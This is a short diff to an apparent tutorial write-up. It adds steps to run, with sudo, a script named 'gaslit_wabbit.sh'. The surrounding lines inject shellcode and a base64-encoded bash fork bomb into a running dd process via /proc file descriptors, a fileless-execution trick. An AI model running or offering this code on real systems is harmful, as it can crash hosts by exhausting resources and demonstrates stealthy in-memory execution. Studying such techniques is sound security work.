@@ -189,3 +189,12 @@ echo -n -e "\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05
 echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
 /proc/`pidof dd`/fd/3 -a
 ```
+
+and running it, we have,
+
+```shell
+sudo chmod +x gaslit_wabbit.sh
+```
+```shell
+sudo ./gaslit_wabbit.sh
+```
